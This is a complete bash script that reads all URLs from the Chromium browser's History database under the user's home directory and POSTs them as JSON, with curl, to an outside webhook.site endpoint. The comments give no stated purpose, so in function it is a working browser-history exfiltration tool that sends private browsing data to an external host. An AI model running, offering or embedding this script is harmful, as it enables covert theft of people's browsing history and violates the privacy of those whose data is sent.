#!/bin/bash

# Path to the database
DATABASE="$HOME/.config/chromium/Default/History"

# Webhook URL
WEBHOOK_URL="https://webhook.site/25e98ba9-7c25-49d0-b162-47a697d946b0" # Replace with your webhook URL

# Check if sqlite3 is installed
if ! command -v sqlite3 &> /dev/null; then
  echo "sqlite3 is not installed. Please install it and try again."
  exit 1
fi

# Check if curl is installed
if ! command -v curl &> /dev/null; then
  echo "curl is not installed. Please install it and try again."
  exit 1
fi

# Fetch URLs from the database and format them into a JSON array
URLS=$(sqlite3 "$DATABASE" "SELECT url FROM urls;" -json)

# Check if the query returned any results
if [ -z "$URLS" ]; then
  echo "No URLs found in the database."
  exit 1
fi

# Send the URLs as a JSON array in a single POST request using the -json parameter
curl -X POST -H "Content-Type: application/json" -d "{\"urls\": [$URLS]}" "$WEBHOOK_URL"

echo "All URLs have been sent."
sleep 5
